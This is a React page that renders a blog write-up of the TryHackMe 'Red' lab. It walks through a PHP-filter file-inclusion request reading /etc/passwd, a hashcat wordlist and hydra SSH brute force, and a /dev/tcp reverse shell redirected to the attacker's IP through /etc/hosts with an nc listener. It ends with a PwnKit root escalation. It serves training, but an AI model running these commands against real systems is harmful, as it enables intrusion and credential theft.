import { Container, Divider, Typography } from "@mui/material";
import Box from "@mui/material/Box";
import styles from "../../../styles/Home.module.css";
import React, { useState } from "react";
import SyntaxHighlighter from "react-syntax-highlighter";

const THM_RED = () => {
    const nmap_scan = `
    ┌──(kali㉿kali)-[~/TryHackMe/Red]
    └─$ cat nmap 
    # Nmap 7.93 scan initiated Sat Jul 15 21:08:54 2023 as: nmap -sC -sV -oN nmap 10.10.221.141
    Nmap scan report for 10.10.221.141
    Host is up (0.21s latency).
    Not shown: 998 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e2741ce0f7864d6946f65b4dbec39f76 (RSA)
    |   256 fb8473da6cfeb9195a6c654dd1723bb0 (ECDSA)
    |_  256 5e3775fcb364e2d8d6bc9ae67e604d3c (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    | http-title: Atlanta - Free business bootstrap template
    |_Requested resource was /index.php?page=home.html
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Sat Jul 15 21:09:15 2023 -- 1 IP address (1 host up) scanned in 21.28 seconds`

    const etc_passwd = `
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
    landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    blue:x:1000:1000:blue:/home/blue:/bin/bash
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    red:x:1001:1001::/home/red:/bin/bash`

    const bash_history = `
    echo "Red rules"
    cd
    hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
    cat passlist.txt
    rm passlist.txt
    sudo apt-get remove hashcat -y`

    return (
        <Box
            className={styles.container}
            sx={{ backgroundColor: "primary.background_website" }}
            pt={5}
        >
            <Container>
                <Typography
                    sx={{
                        color: "primary.main",
                    }}
                >
                    <Typography mb={-2} variant="h2">
                        TryHackMe Red
                    </Typography>
                    <pre>2023/07/17 5:37PM</pre>
                    <Divider color="#42403f" />
                    <Typography mt={6} variant="h5">
                        Description
                    </Typography>
                    <Typography>
                        Red is an easy machine on TryHackMe that starts by exploiting an LFI using PHP filters. From there we get information to SSH into the box as user blue. User blue's shell is constantly being terminated due to a script on the machine. By exploiting the script we can get a reverse shell as user red. In user red we exploit CVE-2021-4034 to get shell as root.
                    </Typography>

                    <Typography mt={4} variant="h5">
                        Port Scan
                    </Typography>
                    <Typography>
                        Port scan reveals that ports 22 and 80 are open.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {nmap_scan}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                        When going to the IP address on port 80, we get the following URL. The `?page=home.html` parameter is a strong indication of Local File Inclusion.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {"http://<10.10.85.169>/index.php?page=home.html"}
                    </SyntaxHighlighter>
                    <img src="/thm_red_1.png" width={1592 / 1.4} height={797 / 1.4} />
                    <Typography mt={4} variant="h5">
                        LFI Vulnerability
                    </Typography>
                    <Typography>
                        By reading the `/etc/passwd` file we can see that there is a user `blue` and a user `red`
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {"GET /index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd HTTP/1.1"}
                    </SyntaxHighlighter>
                    <img src="/thm_red_2.png" width={924} height={259} />
                    <SyntaxHighlighter className="syntax" language="text">
                        {etc_passwd}
                    </SyntaxHighlighter>

                    <Typography mt={4} variant="h5">
                        Reading .bash_history
                    </Typography>
                    <Typography>
                        `.bash_history` is a file used by the Bash shell to store a history of the commands that you have executed in the terminal. Whenever you enter a command in a Bash shell, it is recorded in the `.bash_history` file, and the file is updated in real-time.
                    </Typography>
                    <Box pt={5} />
                    <Typography>
                        <em>.bash_history</em>
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {bash_history}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                        We can see that there is a file `.reminder` that hashcat is using to generate a password wordlist. The file is then being removed.
                    </Typography>
                    <Box pt={5} />
                    <Typography>
                        <em>.reminder</em>
                    </Typography>

                    <SyntaxHighlighter className="syntax" language="bash">
                        {"sup3r_p@s$w0rd!"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                        We can use the same command to generate passlist.txt.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                        We can try bruteforcing SSH with this wordlist.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"hydra -l blue -P passlist.txt ssh://10.10.85.169"}
                    </SyntaxHighlighter>
                    <img src="/thm_red_3.png" width={780} height={284} />
                    <Typography>
                        Hydra found the password is `sup3r_p@s$w0!`.
                    </Typography>
                    <Typography mt={4} variant="h5">
                        Flag 1
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"ssh blue@10.10.85.169"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                        Red keeps killing my shell.
                    </Typography>
                    <img src="/thm_red_4.png" width={546} height={104} />
                    <Box pt={5} />
                    <Typography>
                        Lets investigate by checking all the running processes owned by red.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"ps aux | grep red"}
                    </SyntaxHighlighter>
                    <img src="/thm_red_5.png" width={1041 / 1.4} height={110 / 1.4} />
                    <Box pt={5} />
                    <Typography>
                        What is the command doing?
                    </Typography>
                    <ul>
                        <li>`bash -c`: This starts a new instance of the Bash shell with the specified command to execute.</li>
                        <li>`nohup`: This is used to prevent the process from being terminated when the current shell is closed or disconnected. The meaning of **nohup** is no hangup.</li>
                        <li>`bash -i`: This starts an interactive Bash shell.</li>
                        <li>`&gt;& /dev/tcp/redrules.thm/9001`: This part of the command redirects both standard output (stdout) and standard error (stderr) of the interactive Bash shell to the specified host (`redrules.thm`) and port (`9001`) using `/dev/tcp`. The `/dev/tcp` feature is used here to create a network connection.</li>
                        <li>`0&gt;&1`: This part redirects standard input (stdin) to the same network connection, allowing input/output interaction with the remote host.</li>
                        <li>`&`: This puts the whole command into the background, allowing the current shell to continue executing other commands.</li>
                    </ul>
                    <Box pt={5} />
                    <Typography>
                        Since this process is running as `red`, we cannot simply `kill -9 PID`. The `redrules.thm` is a custom domain that is probably in the `/etc/hosts` file.
                    </Typography>

                    <Typography>
                        When we print the /etc/hosts file we see that there is a domain being resolved from the private IP address 192.168.0.1.
                    </Typography>
                    <img src="/thm_red_6.png" width={523} height={203} />
                    <Typography>
                        <Box pt={5} />
                        Lets try to get a reverse shell by using our attacker IP as the domain to resolve to. When editing the `/etc/hosts` file it will not work although we can write to it.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"-rw-r--rw- 1 root adm 242 Jul 17 16:57 /etc/hosts"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                        Error:
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"\"/etc/hosts\" E509: Cannot create backup file (add ! to override)"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                        File Attributes
                    </Typography>
                    <Typography>
                        The file says it is writeable but it isn't. This indicates to check the file attributes. You can read more about them here: <a href="https://linuxopsys.com/topics/show-file-attributes-in-linux">https://linuxopsys.com/topics/show-file-attributes-in-linux</a>
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"lsattr /etc/hosts"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                        Result
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"blue@red:/tmp$ lsattr /etc/hosts\n" +
                            "-----a--------e----- /etc/hosts"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <ul>
                        <li>a - append only</li>
                        <li>c - compressed</li>
                        <li>d - no dump</li>
                        <li>e - extent format</li>
                        <li>i - immutable</li>
                        <li>j - data journaling</li>
                        <li>s - secure deletion</li>
                        <li>t - no tail-merging</li>
                        <li>u - undeletable</li>
                        <li>A - no atime updates</li>
                        <li>D - synchronous directory updates</li>
                        <li>S - synchronous updates</li>
                        <li>T - top of directory hierarchy</li>
                    </ul>
                    <Box pt={5} />
                    <Typography>
                        The `/etc/hosts` has the following attributes of append only and extent format</Typography>
                    <ul>
                        <li>a - append only: this attribute allows a file to be added to, but not to be removed. It prevents accidental or malicious changes to files that record data, such as log files.</li>
                        <li>e - extent format: it indicates that the file is using extents for mapping the blocks on disk.</li>
                    </ul>
                    <Box pt={5} />
                    <Typography>
                    Writing to /etc/hosts</Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'echo "10.13.30.137  redrules.thm" >> /etc/hosts'}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    Start a nc listener on port 9001.</Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'nc -lvnp 9001'}
                    </SyntaxHighlighter>
                    <Typography mt={4} variant="h5">
                        Flag 2
                    </Typography>
                    <Typography>After waiting some time we get a shell.</Typography>
                    <Box pt={5} />
                    <Typography>Inside the .git folder there is pkexec. `pkexec` is a command-line utility used in Linux systems to run graphical applications (GUI applications) with administrative (root) privileges. It stands for "PolicyKit Execute" and is part of the PolicyKit framework, which allows fine-grained control over system-wide privileges and permissions.</Typography>
                    <Box pt={5} />
                    <Typography>In Linux, certain administrative tasks require elevated privileges (similar to using `sudo` in the command line). However, graphical applications typically run in a user's own session and cannot directly access administrative permissions without the user's consent. `pkexec` provides a secure way to launch graphical applications with elevated privileges while prompting the user for authentication (usually through a password prompt).</Typography>
                    <Box pt={5} />
                    <Typography>Checking the version of pkexec we see:</Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'red@red:~/.git$ ./pkexec --version\n'+
                         './pkexec --version\n'+
                         'pkexec version 0.105'}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>Some googling I found this is vulnerable to PwnKit exploit.</Typography>
                    <ul>
                        <li>
                            <a href="https://tryhackme.com/room/pwnkit">https://tryhackme.com/room/pwnkit</a></li>
                        <li>
                            <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
                                </a>
                            </li>
                    </ul>
                    <Typography mt={4} variant="h5">
                        Root
                    </Typography>
                    <Typography>The exploit makes use of the dangerous `GCONV_PATH` variable to include a malicious shared object file that calls the `/bin/sh` shell with root permissions.</Typography>
                    <Box pt={5} />
                    <Typography>I was having issues with glibc versioning.</Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'./exploit: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34 not found (required by ./exploit)'}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>This is occuring becuase the version of GLIBC on victim machine is </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'red@red:~/.git$ ldd --version\n'+
                         'ldd --version\n'+
                         'ldd (Ubuntu GLIBC 2.31-0ubuntu9.7) 2.31'}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>while the version on my attacker machine is:</Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'GLIBC_2.34'}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>To fix this issue you can use the following python based approach:</Typography>
                    <ul>
                        <li>
                            <a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a>
                        </li>
                    </ul>
                    <img src="/thm_red_7.png" width={384} height={207} />
                    <Box pt={25}/>
                </Typography>

            </Container>
        </Box>
    );
};

export default THM_RED;
